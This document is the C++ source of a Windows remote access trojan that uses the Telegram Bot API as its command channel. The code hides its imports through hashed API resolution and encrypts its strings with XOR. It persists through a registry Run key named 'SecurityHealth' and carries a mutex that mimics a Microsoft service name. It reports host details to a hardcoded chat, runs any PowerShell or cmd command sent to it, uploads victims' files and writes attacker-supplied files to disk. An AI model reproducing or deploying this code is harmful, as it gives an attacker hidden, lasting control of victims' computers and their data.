#include <string>
#include <windows.h>
#include <winhttp.h>
#include <nlohmann/json.hpp>
#include <winreg.h>
#include <fstream>
#include <vector>

// If you see bug: STARTUPINFO, dont worry, it's just a macro expansion issue with Windows headers. The code is correct ^^

#pragma comment(lib, "winhttp.lib")

using json = nlohmann::json;

DWORD CalcHash(const char* data) {
    DWORD hash = 0x24;
    for (size_t i = 0; i < strlen(data); i++)
        hash += data[i] + (hash << 1);
    return hash;
}

LPVOID GetProcByHash(HMODULE hModule, DWORD targetHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);
    DWORD* funcs = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);
    DWORD* names = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
    WORD*  ords  = (WORD*) ((BYTE*)hModule + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hModule + names[i]);
        if (CalcHash(name) == targetHash)
            return (LPVOID)((BYTE*)hModule + funcs[ords[i]]);
    }
    return NULL;
}

#define HASH_RegOpenKeyExA        127569269
#define HASH_RegSetValueExA       382791467
#define HASH_RegQueryValueExA     3446660369
#define HASH_RegCloseKey          14148451
#define HASH_CreateProcessA       366453518
#define HASH_CreatePipe           4523990
#define HASH_GetCurrentDirectoryA 1238921847
#define HASH_SetCurrentDirectoryA 2301157563
#define HASH_FormatMessageA       372364073
#define HASH_WaitForSingleObject  365136931
#define HASH_CloseHandle          13542392
#define HASH_SetHandleInformation 2188358166
#define HASH_FreeConsole          13727387

typedef LONG  (WINAPI* RegOpenKeyExA_t)       (HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG  (WINAPI* RegSetValueExA_t)       (HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG  (WINAPI* RegQueryValueExA_t)     (HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG  (WINAPI* RegCloseKey_t)          (HKEY);
typedef BOOL  (WINAPI* CreateProcessA_t)       (LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL  (WINAPI* CreatePipe_t)           (PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD (WINAPI* GetCurrentDirectoryA_t) (DWORD, LPSTR);
typedef BOOL  (WINAPI* SetCurrentDirectoryA_t) (LPCSTR);
typedef DWORD (WINAPI* FormatMessageA_t)       (DWORD, LPCVOID, DWORD, DWORD, LPSTR, DWORD, va_list*);
typedef DWORD (WINAPI* WaitForSingleObject_t)  (HANDLE, DWORD);
typedef BOOL  (WINAPI* CloseHandle_t)          (HANDLE);
typedef BOOL  (WINAPI* SetHandleInformation_t) (HANDLE, DWORD, DWORD);
typedef BOOL  (WINAPI* FreeConsole_t)          (void);

RegOpenKeyExA_t        myRegOpenKeyExA        = NULL;
RegSetValueExA_t       myRegSetValueExA       = NULL;
RegQueryValueExA_t     myRegQueryValueExA     = NULL;
RegCloseKey_t          myRegCloseKey          = NULL;
CreateProcessA_t       myCreateProcessA       = NULL;
CreatePipe_t           myCreatePipe           = NULL;
GetCurrentDirectoryA_t myGetCurrentDirectoryA = NULL;
SetCurrentDirectoryA_t mySetCurrentDirectoryA = NULL;
FormatMessageA_t       myFormatMessageA       = NULL;
WaitForSingleObject_t  myWaitForSingleObject  = NULL;
CloseHandle_t          myCloseHandle          = NULL;
SetHandleInformation_t mySetHandleInformation = NULL;
FreeConsole_t          myFreeConsole          = NULL;

void XORDecrypt(char* dest, const unsigned char* src, size_t len, char key) {
    for (size_t i = 0; i < len; i++) dest[i] = src[i] ^ key;
    dest[len] = '\0';
}

const unsigned char encryptedRegPath[] = {
    0x6, 0x3a, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30, 0x9, 0x18, 0x3c, 0x36,
    0x27, 0x3a, 0x26, 0x3a, 0x33, 0x21, 0x9, 0x2, 0x3c, 0x3b, 0x31, 0x3a,
    0x22, 0x26, 0x9, 0x16, 0x20, 0x27, 0x27, 0x30, 0x3b, 0x21, 0x3, 0x30,
    0x27, 0x26, 0x3c, 0x3a, 0x3b, 0x9, 0x7, 0x20, 0x3b, 0x00
};

const unsigned char encryptedBotToken[] = {
    0x6d, 0x62, 0x62, 0x6c, 0x60, 0x60, 0x63, 0x65, 0x6c, 0x64, 0x6f, 0x14,
    0x14, 0x13, 0x7, 0x24, 0x3d, 0x0, 0x67, 0x2, 0x3d, 0x2c, 0x2f, 0x1c,
    0x13, 0x65, 0x2f, 0x1d, 0x24, 0xf, 0x30, 0x2d, 0x2f, 0x11, 0x3e, 0x16,
    0x62, 0x39, 0x25, 0x3d, 0xd, 0x60, 0x27, 0x25, 0x65, 0x14, 0x00
};

const long long serverChatId = 6539531752LL;
static const wchar_t* TELE_HOST = L"api.telegram.org";

std::string whRequest(const std::wstring& path, const std::string& method,
                      const std::string& body, const std::wstring& extraHeaders,
                      const std::string& destFile = "") {
    HINTERNET hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return "";

    HINTERNET hConn = WinHttpConnect(hSess, TELE_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return ""; }

    std::wstring wMethod(method.begin(), method.end());
    HINTERNET hReq = WinHttpOpenRequest(hConn, wMethod.c_str(), path.c_str(),
                                         NULL, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return ""; }

    DWORD timeout = 60000;
    WinHttpSetOption(hReq, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    LPCWSTR hdrs   = extraHeaders.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : extraHeaders.c_str();
    DWORD   hdrLen = extraHeaders.empty() ? 0 : (DWORD)-1;
    LPVOID  data   = body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.data();
    DWORD   dataLen = (DWORD)body.size();

    std::string result;
    if (WinHttpSendRequest(hReq, hdrs, hdrLen, data, dataLen, dataLen, 0)
        && WinHttpReceiveResponse(hReq, NULL)) {

        if (!destFile.empty()) {
            FILE* fp = fopen(destFile.c_str(), "wb");
            if (fp) {
                DWORD avail, read; char buf[8192];
                while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
                    DWORD chunk = avail < (DWORD)sizeof(buf) ? avail : (DWORD)sizeof(buf);
                    if (WinHttpReadData(hReq, buf, chunk, &read) && read > 0)
                        fwrite(buf, 1, read, fp);
                }
                fclose(fp);
                result = "ok";
            }
        } else {
            DWORD avail, read;
            while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
                std::vector<char> buf(avail);
                if (WinHttpReadData(hReq, buf.data(), avail, &read) && read > 0)
                    result.append(buf.data(), read);
            }
        }
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return result;
}

static std::string botPath() {
    char token[64];
    XORDecrypt(token, encryptedBotToken, sizeof(encryptedBotToken) - 1, 0x55);
    return "/bot" + std::string(token);
}

static std::string teleGet(const std::string& path) {
    return whRequest(std::wstring(path.begin(), path.end()), "GET", "", L"");
}

static std::string telePost(const std::string& path, const json& body) {
    std::string s = body.dump();
    return whRequest(std::wstring(path.begin(), path.end()), "POST", s,
                     L"Content-Type: application/json\r\n");
}

void sendMessage(long long chatId, const std::string& text) {
    telePost(botPath() + "/sendMessage", {{"chat_id", chatId}, {"text", text}});
}

void sendChunked(long long chatId, const std::string& text) {
    const size_t CHUNK = 4000;
    if (text.empty()) { sendMessage(chatId, "(no output)"); return; }
    for (size_t i = 0; i < text.size(); i += CHUNK)
        sendMessage(chatId, text.substr(i, CHUNK));
}

void sendDocument(long long chatId, const std::string& filePath) {
    std::ifstream f(filePath, std::ios::binary);
    if (!f) { sendMessage(chatId, "[-] File not found: " + filePath); return; }
    std::vector<char> data((std::istreambuf_iterator<char>(f)), {});

    std::string name = filePath;
    size_t sep = name.find_last_of("\\/");
    if (sep != std::string::npos) name = name.substr(sep + 1);

    const std::string boundary = "----WinHTTPBoundary7MA4YWxkTrZu0gW";
    std::string body;
    body += "--" + boundary + "\r\n"
            "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
          + std::to_string(chatId) + "\r\n";
    body += "--" + boundary + "\r\n"
            "Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n";
    body.append(data.data(), data.size());
    body += "\r\n--" + boundary + "--\r\n";

    std::wstring ct = L"Content-Type: multipart/form-data; boundary=----WinHTTPBoundary7MA4YWxkTrZu0gW\r\n";
    whRequest(std::wstring((botPath() + "/sendDocument").begin(),
                            (botPath() + "/sendDocument").end()),
              "POST", body, ct);
}

bool downloadTelegramFile(const std::string& fileId, const std::string& destPath) {
    try {
        json res = json::parse(teleGet(botPath() + "/getFile?file_id=" + fileId));
        if (!res["ok"].get<bool>()) return false;

        std::string fp = res["result"]["file_path"].get<std::string>();
        char token[64];
        XORDecrypt(token, encryptedBotToken, sizeof(encryptedBotToken) - 1, 0x55);
        std::string dlPath = "/file/bot" + std::string(token) + "/" + fp;

        return whRequest(std::wstring(dlPath.begin(), dlPath.end()),
                         "GET", "", L"", destPath) == "ok";
    } catch (...) { return false; }
}

json getUpdates(long long offset = 0) {
    std::string path = botPath() + "/getUpdates?timeout=30&offset=" + std::to_string(offset);
    std::string resp = teleGet(path);
    if (resp.empty()) return json::object();
    try { return json::parse(resp); } catch (...) { return json::object(); }
}

std::string executePS(const std::string& cmd) {
    std::string command = cmd;
    size_t start = command.find_first_not_of(" \t");
    if (start == std::string::npos) return "(empty command)";
    command = command.substr(start);

    size_t sp = command.find_first_of(" \t");
    std::string verb = (sp == std::string::npos) ? command : command.substr(0, sp);
    std::string rest = (sp == std::string::npos) ? "" : command.substr(sp + 1);

    if (verb == "cd" || verb == "cd..") {
        std::string path = (verb == "cd..") ? ".." : rest;
        size_t s = path.find_first_not_of(" \t");
        size_t e = path.find_last_not_of(" \t");
        if (s != std::string::npos) path = path.substr(s, e - s + 1);

        if (path.empty() || path == ".") {
            char buf[MAX_PATH];
            return myGetCurrentDirectoryA(MAX_PATH, buf) ? "CWD: " + std::string(buf) : "Error";
        }
        if (mySetCurrentDirectoryA(path.c_str())) {
            char buf[MAX_PATH];
            return myGetCurrentDirectoryA(MAX_PATH, buf) ? "-> " + std::string(buf) : "Changed";
        }
        DWORD err = GetLastError();
        char msg[256];
        myFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, 0, msg, sizeof(msg), NULL);
        return "Error: " + std::string(msg);
    }

    HANDLE rPipe, wPipe;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    if (!myCreatePipe(&rPipe, &wPipe, &sa, 0)) return "Error: cannot create pipe";
    mySetHandleInformation(rPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = wPipe;
    si.hStdError  = wPipe;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi;
    std::string cmdLine = (command.find("-EncodedCommand") == 0)
        ? "powershell.exe " + command
        : "powershell.exe -NoProfile -NonInteractive -Command \"" + command + "\"";

    BOOL ok = myCreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    myCloseHandle(wPipe);

    if (!ok) {
        myCloseHandle(rPipe);
        DWORD err = GetLastError();
        char msg[256];
        myFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, 0, msg, sizeof(msg), NULL);
        return "Error: " + std::string(msg);
    }

    std::string result;
    char buf[4096];
    DWORD bytesRead;
    while (ReadFile(rPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        result += buf;
    }

    DWORD waitResult = myWaitForSingleObject(pi.hProcess, 30000);
    if (waitResult == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        result += "\n[killed: process timeout after 30s]";
    }

    myCloseHandle(rPipe);
    myCloseHandle(pi.hProcess);
    myCloseHandle(pi.hThread);

    return result.empty() ? "(no output)" : result;
}

std::string getClientName() {
    char computer[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cSize = sizeof(computer);
    GetComputerNameA(computer, &cSize);

    char user[256] = {};
    DWORD uSize = sizeof(user);
    GetUserNameA(user, &uSize);

    return std::string(computer) + "\\" + std::string(user);
}

std::string handleInformation() {
    return executePS(
        "$os  = Get-CimInstance Win32_OperatingSystem;"
        "$cpu = (Get-CimInstance Win32_Processor | Select-Object -First 1).Name;"
        "$ram = [math]::Round($os.TotalVisibleMemorySize/1MB, 1);"
        "$net = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'}).IPAddress) -join ', ';"
        "$up  = [math]::Round(((Get-Date)-$os.LastBootUpTime).TotalHours, 1);"
        "Write-Output '== System Information ==';"
        "Write-Output ('Host   : ' + $env:COMPUTERNAME);"
        "Write-Output ('User   : ' + $env:USERNAME);"
        "Write-Output ('Domain : ' + $env:USERDOMAIN);"
        "Write-Output ('OS     : ' + $os.Caption + ' ' + $os.OSArchitecture);"
        "Write-Output ('Build  : ' + $os.BuildNumber);"
        "Write-Output ('CPU    : ' + $cpu);"
        "Write-Output ('RAM    : ' + $ram + ' GB');"
        "Write-Output ('IP     : ' + $net);"
        "Write-Output ('Uptime : ' + $up + ' hours');"
        "Write-Output ('CWD    : ' + (Get-Location).Path)"
    );
}

void EnsurePersistence() {
    char regPath[256];
    XORDecrypt(regPath, encryptedRegPath, sizeof(encryptedRegPath) - 1, 0x55);

    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string value = "\"" + std::string(exePath) + "\" --hidden";

    HKEY hKey;
    if (myRegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return;

    char existing[MAX_PATH]; DWORD vSize = sizeof(existing), type;
    bool needSet = true;
    if (myRegQueryValueExA(hKey, "SecurityHealth", NULL, &type, (LPBYTE)existing, &vSize) == ERROR_SUCCESS
        && type == REG_SZ && value == existing)
        needSet = false;

    if (needSet)
        myRegSetValueExA(hKey, "SecurityHealth", 0, REG_SZ,
                         (const BYTE*)value.c_str(), (DWORD)value.size() + 1);
    myRegCloseKey(hKey);
}

int main(int argc, char* argv[]) {
    try {
        HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MicrosoftSecurityHealthService");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(hMutex);
            return 0;
        }

        HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
        HMODULE hKernel = LoadLibraryA("kernel32.dll");
        if (!hAdvapi || !hKernel) return 1;

        myRegOpenKeyExA        = (RegOpenKeyExA_t)       GetProcByHash(hAdvapi, HASH_RegOpenKeyExA);
        myRegSetValueExA       = (RegSetValueExA_t)      GetProcByHash(hAdvapi, HASH_RegSetValueExA);
        myRegQueryValueExA     = (RegQueryValueExA_t)    GetProcByHash(hAdvapi, HASH_RegQueryValueExA);
        myRegCloseKey          = (RegCloseKey_t)         GetProcByHash(hAdvapi, HASH_RegCloseKey);
        myCreateProcessA       = (CreateProcessA_t)      GetProcByHash(hKernel, HASH_CreateProcessA);
        myCreatePipe           = (CreatePipe_t)          GetProcByHash(hKernel, HASH_CreatePipe);
        myGetCurrentDirectoryA = (GetCurrentDirectoryA_t)GetProcByHash(hKernel, HASH_GetCurrentDirectoryA);
        mySetCurrentDirectoryA = (SetCurrentDirectoryA_t)GetProcByHash(hKernel, HASH_SetCurrentDirectoryA);
        myFormatMessageA       = (FormatMessageA_t)      GetProcByHash(hKernel, HASH_FormatMessageA);
        myWaitForSingleObject  = (WaitForSingleObject_t) GetProcByHash(hKernel, HASH_WaitForSingleObject);
        myCloseHandle          = (CloseHandle_t)         GetProcByHash(hKernel, HASH_CloseHandle);
        mySetHandleInformation = (SetHandleInformation_t)GetProcByHash(hKernel, HASH_SetHandleInformation);
        myFreeConsole          = (FreeConsole_t)         GetProcByHash(hKernel, HASH_FreeConsole);

        if (!myRegOpenKeyExA || !myRegSetValueExA || !myRegQueryValueExA ||
            !myRegCloseKey   || !myCreateProcessA  || !myCreatePipe      ||
            !myGetCurrentDirectoryA || !mySetCurrentDirectoryA           ||
            !myFormatMessageA || !myWaitForSingleObject || !myCloseHandle ||
            !mySetHandleInformation || !myFreeConsole)
            return 1;

        bool background = false;
        for (int i = 1; i < argc; ++i)
            if (strcmp(argv[i], "--background") == 0) { background = true; break; }

        EnsurePersistence();

        if (background) {
            srand(GetTickCount());
            Sleep(10000 + rand() % 20000);
        }

        std::string clientName = getClientName();

        json first;
        int retries = 0;
        do {
            first = getUpdates();
            if (first.contains("ok") && first["ok"].get<bool>()) break;
            Sleep(3000);
        } while (++retries < 10);

        if (retries >= 10) return 1;

        long long lastUpdateId = 0;
        if (first.contains("result") && first["result"].is_array())
            for (auto& u : first["result"])
                if (u["update_id"].get<long long>() > lastUpdateId)
                    lastUpdateId = u["update_id"].get<long long>();

        sendMessage(serverChatId, "[+] Online: " + clientName + "\nSend /help for commands.");

        bool   uploadPending  = false;
        std::string uploadDest;

        while (true) {
            json updates = getUpdates(lastUpdateId + 1);

            if (!updates.contains("result") || !updates["result"].is_array()) {
                Sleep(500);
                continue;
            }

            for (auto& update : updates["result"]) {
                lastUpdateId = update["update_id"].get<long long>();
                if (!update.contains("message")) continue;

                auto& msg = update["message"];

                if (msg["chat"]["id"].get<long long>() != serverChatId) continue;

                if (uploadPending && msg.contains("document")) {
                    std::string fileId   = msg["document"]["file_id"].get<std::string>();
                    std::string fileName = msg["document"]["file_name"].get<std::string>();
                    std::string dest     = uploadDest.empty() ? fileName : uploadDest;
                    uploadPending = false;

                    sendMessage(serverChatId,
                        downloadTelegramFile(fileId, dest)
                            ? "[+] Saved: " + dest
                            : "[-] Upload failed");
                    continue;
                }

                if (!msg.contains("text")) continue;
                std::string text = msg["text"].get<std::string>();

                if (text == "/help" || text == "/start") {
                    sendMessage(serverChatId,
                        "Commands\n"
                        "────────────────────\n"
                        "/information      system info\n"
                        "/healthcheck      ping: confirm host is alive\n"
                        "/download <path>  send file to Telegram\n"
                        "/upload [dest]    receive file (send file after)\n"
                        "/help             this message\n"
                        "\n"
                        "Everything else runs as PowerShell.\n"
                        "cd / cd.. are handled natively (persists across commands).");
                }
                else if (text == "/healthcheck") {
                    sendMessage(serverChatId, "[+] ALIVE: " + clientName + " | PID: " + std::to_string(GetCurrentProcessId()));
                }
                else if (text == "/information") {
                    sendChunked(serverChatId, handleInformation());
                }
                else if (text.rfind("/download ", 0) == 0) {
                    std::string path = text.substr(10);
                    size_t s = path.find_first_not_of(" \t");
                    if (s == std::string::npos) {
                        sendMessage(serverChatId, "Usage: /download <full_path>");
                    } else {
                        path = path.substr(s);
                        sendMessage(serverChatId, "[*] Sending: " + path);
                        sendDocument(serverChatId, path);
                    }
                }
                else if (text.rfind("/upload", 0) == 0) {
                    uploadPending = true;
                    uploadDest    = "";
                    if (text.size() > 8) {
                        std::string d = text.substr(8);
                        size_t s = d.find_first_not_of(" \t");
                        if (s != std::string::npos) uploadDest = d.substr(s);
                    }
                    sendMessage(serverChatId,
                        uploadDest.empty()
                            ? "[*] Ready. Send the file (will save with original name)."
                            : "[*] Ready. Send the file (will save to: " + uploadDest + ").");
                }
                else if (text.rfind("cmd ", 0) == 0) {
                    std::string output = executePS("cmd /c " + text.substr(4));
                    sendChunked(serverChatId, "[" + clientName + "]\n" + output);
                }
                else {
                    std::string output = executePS(text);
                    sendChunked(serverChatId, "[" + clientName + "]\n" + output);
                }
            }

            Sleep(500);
        }

        return 0;
    } catch (...) { return 1; }
}
